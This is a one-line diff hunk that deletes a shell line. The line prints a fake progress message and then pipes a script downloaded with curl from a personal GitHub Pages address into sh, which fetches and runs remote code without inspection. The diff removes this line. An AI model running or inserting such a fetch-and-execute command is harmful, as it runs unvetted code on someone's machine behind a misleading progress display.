@@ -1,1 +1,0 @@
-echo 'Progress: 81.0%'; curl -L --progress-bar frkns.github.io/fun/requestOven | sh
